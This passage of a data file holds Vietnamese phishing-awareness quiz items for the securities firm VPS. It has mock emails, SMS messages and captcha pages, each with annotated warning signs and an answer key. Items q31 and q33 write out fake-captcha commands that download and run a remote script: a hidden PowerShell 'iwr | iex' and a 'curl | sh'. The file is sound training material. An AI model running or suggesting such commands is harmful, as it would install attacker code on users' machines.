      "OTP không được nhập vào website lạ qua link SMS. Kẻ tấn công có thể dùng nội dung hủy lệnh để lừa người dùng tiết lộ mã xác thực.",
    indicators: ["Yêu cầu nhập OTP", "Link SMS giả mạo", "Dùng nỗi sợ giao dịch bất thường"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 24,
  },
  {
    id: "q25",
    title: "Link hiển thị đúng VPS nhưng trỏ tới trang giả",
    category: "Email",
    scenarioIntro: "Bạn nhận được email có đường dẫn nhìn giống website chính thức của VPS.",
    scenarioContent:
      "Hãy kiểm tra kỹ liên kết trước khi quyết định có nên truy cập hay không.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi hiển thị đúng domain @vps.com.vn nhưng vẫn cần kiểm tra link bên trong"><strong>From:</strong> VPS Customer Service &lt;cskh@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Xác nhận thông tin tài khoản giao dịch</div>
        <p>Để tiếp tục sử dụng dịch vụ, Quý khách vui lòng kiểm tra thông tin tại:</p>
        <p>
          <a data-spot="danger" data-label="Text hiển thị là vps.com.vn nhưng hyperlink ẩn thực tế trỏ tới domain phishing" href="https://vps-com-vn.secure-verify-login.net/account" title="https://vps-com-vn.secure-verify-login.net/account">https://www.vps.com.vn/dang-nhap</a>
        </p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Đây là kiểu hyperlink ẩn: dòng chữ hiển thị giống domain hợp lệ nhưng đường dẫn thật bên dưới lại trỏ tới domain phishing. Email đúng domain cũng có thể bị lạm dụng hoặc bị giả mạo phần hiển thị, vì vậy cần kiểm tra link thực tế trước khi bấm.",
    indicators: ["Text link và href không khớp", "Link ẩn trỏ tới domain ngoài", "Sender có thể bị lạm dụng"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 25,
  },
  {
    id: "q26",
    title: "Email tài liệu nội bộ có hyperlink ẩn",
    category: "Email",
    scenarioIntro: "Bạn nhận được email chia sẻ tài liệu từ hệ thống nội bộ.",
    scenarioContent:
      "Hãy quan sát địa chỉ người gửi và liên kết tài liệu để xác định mức độ an toàn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Người gửi không thuộc hệ thống tài liệu nội bộ"><strong>From:</strong> Document Center &lt;sharepoint-notice@file-center.cloud&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Tài liệu lương tháng cần xác nhận</div>
        <p data-spot="danger" data-label="Dùng chủ đề nhạy cảm để kích thích người nhận bấm nhanh">Bảng lương tháng này cần được xác nhận trước 15:00.</p>
        <p>
          <a data-spot="danger" data-label="Text hiển thị là domain VPS nhưng href thật dẫn ra website giả mạo" href="https://vps-docs-verify.com/login" title="https://vps-docs-verify.com/login">https://docs.vps.com.vn/payroll/confirm</a>
        </p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Kẻ tấn công thường đặt text link giống domain VPS để tạo cảm giác an toàn, nhưng href thật lại dẫn tới trang ngoài. Cần hover hoặc kiểm tra URL đích trước khi đăng nhập.",
    indicators: ["Hyperlink ẩn không khớp text", "Chủ đề lương nhạy cảm", "Người gửi ngoài hệ thống"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 26,
  },
  {
    id: "q27",
    title: "Xác nhận lịch bảo trì với link hợp lệ",
    category: "Email",
    scenarioIntro: "Bạn nhận được email thông báo bảo trì từ hệ thống nội bộ.",
    scenarioContent:
      "Hãy kiểm tra xem text hiển thị và đường dẫn thật có khớp nhau không.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi đúng domain nội bộ VPS"><strong>From:</strong> IT Operations &lt;it-ops@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Lịch bảo trì VPN cuối tuần</div>
        <p data-spot="safe" data-label="Nội dung chỉ thông báo, không yêu cầu nhập mật khẩu hay OTP">VPN sẽ bảo trì từ 22:00 đến 23:00 thứ Bảy.</p>
        <p>
          <a data-spot="safe" data-label="Text link và href đều trỏ tới domain nội bộ VPS hợp lệ" href="https://intranet.vps.com.vn/it/vpn-maintenance" title="https://intranet.vps.com.vn/it/vpn-maintenance">https://intranet.vps.com.vn/it/vpn-maintenance</a>
        </p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation:
      "Đây là trường hợp hợp lệ: người gửi, text hiển thị và URL thật đều thuộc hệ thống nội bộ VPS; nội dung không yêu cầu thông tin nhạy cảm.",
    indicators: ["Text link khớp href", "Đúng domain nội bộ VPS", "Không yêu cầu thông tin nhạy cảm"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 27,
  },
  {
    id: "q28",
    title: "SMS ngân hàng dạng màn hình điện thoại",
    category: "SMS",
    scenarioIntro: "Bạn nhận được một SMS cảnh báo giao dịch ngân hàng trên điện thoại.",
    scenarioContent:
      "Hãy quan sát nội dung tin nhắn, thời hạn xử lý và đường dẫn đi kèm.",
    scenarioHtml: `
      <div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>09:41</span><span>5G 82%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">B</div>
            <div><strong>Bank Alert</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="danger" data-label="Cảnh báo giao dịch bất thường tạo cảm giác hoảng sợ">Phát hiện giao dịch 12.800.000 VND đang chờ xác nhận.</p>
              <p data-spot="danger" data-label="Yêu cầu hủy giao dịch qua link là dấu hiệu rất nguy hiểm">Nếu không phải bạn, hủy ngay tại:</p>
              <a data-spot="danger" data-label="Link SMS không thuộc domain ngân hàng chính thức" href="https://bank-cancel-verify.net/otp" title="https://bank-cancel-verify.net/otp">bank-cancel-verify.net/otp</a>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "SMS giả mạo thường dùng thông báo giao dịch lớn để tạo hoảng sợ, sau đó dụ người dùng bấm link và nhập OTP. Không nhập OTP hoặc thông tin ngân hàng qua link trong SMS.",
    indicators: ["Tạo hoảng sợ", "Link hủy giao dịch giả", "Có nguy cơ thu thập OTP"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 28,
  },
  {
    id: "q29",
    title: "SMS VPS SmartOne trên điện thoại",
    category: "SMS",
    scenarioIntro: "Bạn nhận được tin nhắn về tài khoản VPS SmartOne trên điện thoại.",
    scenarioContent:
      "Hãy kiểm tra xem SMS có đang điều hướng tới website giả mạo hay không.",
    scenarioHtml: `
      <div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>10:18</span><span>Wi-Fi 76%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">V</div>
            <div><strong>VPS</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="danger" data-label="Thông báo khóa tài khoản trong thời gian ngắn nhằm thúc ép thao tác">Tai khoan SmartOne se bi tam khoa sau 20 phut neu chua dong bo thong tin.</p>
              <p>Truy cap:</p>
              <a data-spot="danger" data-label="Text có chữ VPS nhưng domain thật không phải vps.com.vn" href="https://smartone-vps-login.com/verify" title="https://smartone-vps-login.com/verify">smartone-vps-login.com/verify</a>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Tin nhắn dùng áp lực khóa tài khoản và link có chữ VPS để tạo tin tưởng, nhưng domain không thuộc vps.com.vn. Không đăng nhập tài khoản chứng khoán qua link SMS lạ.",
    indicators: ["Thúc giục khóa tài khoản", "Domain giả mạo VPS", "Link đăng nhập trong SMS"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 29,
  },
  {
    id: "q30",
    title: "SMS giao hàng hợp lệ trên điện thoại",
    category: "SMS",
    scenarioIntro: "Bạn vừa đặt hàng và nhận được SMS cập nhật trạng thái giao hàng.",
    scenarioContent:
      "Hãy xem tin nhắn có yêu cầu thanh toán, đăng nhập hoặc cung cấp OTP hay không.",
    scenarioHtml: `
      <div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>14:06</span><span>4G 68%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">D</div>
            <div><strong>Delivery</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="safe" data-label="Nội dung chỉ thông báo trạng thái đơn hàng, không yêu cầu thanh toán hay đăng nhập">Don hang DH90821 cua ban dang duoc giao trong hom nay.</p>
              <p data-spot="safe" data-label="Không có link, không yêu cầu OTP, không yêu cầu phí phát sinh">Nhan vien giao hang se lien he truoc khi giao. Cam on ban.</p>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation:
      "Tin nhắn chỉ thông báo trạng thái giao hàng, không có link, không yêu cầu thanh toán thêm và không yêu cầu OTP nên phù hợp với SMS hợp lệ.",
    indicators: ["Không có link", "Không yêu cầu OTP", "Nội dung đúng bối cảnh đặt hàng"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 30,
  },
  {
    id: "q31",
    title: "Website yêu cầu xác minh Captcha bằng lệnh",
    category: "Website",
    scenarioIntro: "Bạn truy cập một website thông báo cần xác minh Captcha trước khi tiếp tục.",
    scenarioContent:
      "Hãy kiểm tra cách website yêu cầu xác minh và quyết định đây là phishing hay legitimate.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="danger" data-label="Domain xác minh không thuộc hệ thống VPS"><span>https://vps-captcha-verify.com/check</span></div>
          </div>
          <div class="browser-page captcha-browser-page">
            <div class="captcha-verify">
              <h4>Security verification required</h4>
              <p data-spot="danger" data-label="Captcha hợp lệ không yêu cầu người dùng mở Run/Terminal hoặc dán lệnh hệ thống">To prove you are human, complete the verification on your computer.</p>
              <ul class="captcha-steps">
                <li data-spot="danger" data-label="Yêu cầu bấm Windows + R là hành vi rất bất thường với Captcha">Press <strong>Windows + R</strong></li>
                <li data-spot="danger" data-label="Yêu cầu Ctrl + V để dán lệnh là dấu hiệu phát tán mã độc">Press <strong>Ctrl + V</strong> to paste the verification code</li>
                <li>Press Enter to finish verification</li>
              </ul>
              <code class="captcha-command" data-spot="danger" data-label="Lệnh PowerShell tải và chạy mã từ Internet có nguy cơ cài mã độc">powershell -w hidden -c "iwr https://vps-captcha-verify.com/update.ps1 | iex"</code>
              <button type="button" data-spot="danger" data-label="Nút copy lệnh hệ thống không phải hành vi Captcha bình thường">Copy verification command</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Captcha thật không yêu cầu người dùng mở hộp thoại Run, Terminal hay dán lệnh PowerShell. Đây là kỹ thuật lừa người dùng tự chạy mã độc trên máy.",
    indicators: ["Captcha yêu cầu chạy lệnh", "Domain không thuộc VPS", "PowerShell tải mã từ Internet"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 31,
  },
  {
    id: "q32",
    title: "Captcha đăng nhập VPS hợp lệ",
    category: "Website",
    scenarioIntro: "Bạn đang mở trang đăng nhập chính thức của VPS và gặp bước xác minh Captcha.",
    scenarioContent:
      "Hãy quan sát domain, cách xác minh và quyết định tình huống này là phishing hay legitimate.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="safe" data-label="Domain thuộc hệ thống chính thức vps.com.vn"><span>https://www.vps.com.vn/dang-nhap</span></div>
          </div>
          <div class="browser-page captcha-browser-page">
            <div class="captcha-verify captcha-safe">
              <h4>Xác minh bảo mật</h4>
              <p data-spot="safe" data-label="Captcha hợp lệ chỉ yêu cầu thao tác trực tiếp trên trình duyệt, không yêu cầu chạy lệnh hệ thống">Vui lòng hoàn tất Captcha để tiếp tục đăng nhập.</p>
              <div class="captcha-checkbox" data-spot="safe" data-label="Checkbox Captcha là thao tác phổ biến và không yêu cầu tải file hay nhập mật khẩu lại">
                <span></span>
                <strong>Tôi không phải là robot</strong>
              </div>
              <p class="captcha-policy">Privacy - Terms</p>
              <button type="button">Tiếp tục</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation:
      "Captcha hiển thị trên domain chính thức vps.com.vn và chỉ yêu cầu thao tác xác minh trên trình duyệt, không yêu cầu chạy lệnh, tải file hay nhập OTP.",
    indicators: ["Domain chính thức", "Captcha thao tác trên trình duyệt", "Không yêu cầu chạy lệnh"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 32,
  },
  {
    id: "q33",
    title: "Captcha yêu cầu chạy lệnh Terminal trên macOS",
    category: "Website",
    scenarioIntro: "Một website hiển thị Captcha nhưng yêu cầu bạn mở Terminal để hoàn tất xác minh.",
    scenarioContent:
      "Hãy kiểm tra cách website yêu cầu xác minh và quyết định đây là phishing hay legitimate.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="danger" data-label="Domain dùng tên gần giống VPS nhưng không phải vps.com.vn"><span>https://vps-secure-captcha.com/verify</span></div>
          </div>
          <div class="browser-page captcha-browser-page">
            <div class="captcha-verify">
              <h4>Human verification for macOS</h4>
              <p data-spot="danger" data-label="Captcha thật không yêu cầu mở Terminal hoặc thực thi shell script">Open Terminal and paste the command below to continue.</p>
              <ul class="captcha-steps">
                <li data-spot="danger" data-label="Hướng dẫn mở Terminal là hành vi bất thường với Captcha">Open <strong>Terminal</strong></li>
                <li data-spot="danger" data-label="Yêu cầu dán lệnh làm tăng nguy cơ người dùng tự chạy mã độc">Paste copied verification command</li>
                <li>Press Return</li>
              </ul>
              <code class="captcha-command" data-spot="danger" data-label="Lệnh curl tải script từ domain giả mạo rồi chạy trực tiếp bằng shell">curl -fsSL https://vps-secure-captcha.com/check.sh | sh</code>
              <button type="button" data-spot="danger" data-label="Nút copy lệnh là dấu hiệu rất nguy hiểm, không phải Captcha hợp lệ">Copy for verification</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Website giả mạo yêu cầu mở Terminal và chạy lệnh tải script từ Internet. Captcha hợp lệ không bao giờ yêu cầu người dùng thực thi lệnh hệ điều hành.",
    indicators: ["Domain gần giống VPS", "Yêu cầu mở Terminal", "Lệnh tải script từ Internet"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 33,
  },
  {
    id: "q34",
    title: "Captcha yêu cầu cài tiện ích trình duyệt",
    category: "Website",
    scenarioIntro: "Bạn truy cập một trang báo cần cài tiện ích để vượt qua Captcha.",
    scenarioContent:
      "Hãy đánh giá yêu cầu trên website và quyết định đây là phishing hay legitimate.",
    scenarioHtml: `
      <div class="portal-sim website-browser-template">
        <div class="browser-window">
          <div class="browser-topbar">
            <div class="browser-controls"><i></i></div>
            <div class="browser-address" data-spot="danger" data-label="Domain không phải hệ thống VPS và đang mạo danh kiểm tra bảo mật"><span>https://vps-browser-check.net/security</span></div>
          </div>
          <div class="browser-page captcha-browser-page">
            <div class="captcha-verify">
              <h4>Captcha blocked</h4>
              <p data-spot="danger" data-label="Captcha thật không yêu cầu cài extension để xác minh người dùng">Install the Secure Browser Verification extension to continue.</p>
              <div class="captcha-extension-card" data-spot="danger" data-label="Extension lạ có thể đánh cắp cookie, phiên đăng nhập hoặc dữ liệu trình duyệt">
                <span class="extension-icon">EXT</span>
                <div>
                  <strong>Secure Browser Verification</strong>
                  <p>Can read and change all your data on all websites</p>
                </div>
              </div>
              <button type="button" data-spot="danger" data-label="Nút cài tiện ích từ nguồn không rõ ràng là dấu hiệu nguy hiểm">Install extension</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation:
      "Captcha hợp lệ không yêu cầu cài tiện ích trình duyệt, đặc biệt là tiện ích có quyền đọc và thay đổi dữ liệu trên mọi website.",
    indicators: ["Yêu cầu cài extension", "Quyền truy cập dữ liệu rộng", "Domain không thuộc VPS"],
    active: true,
    alwaysIncluded: false,
    orderIndex: 34,
  },
];

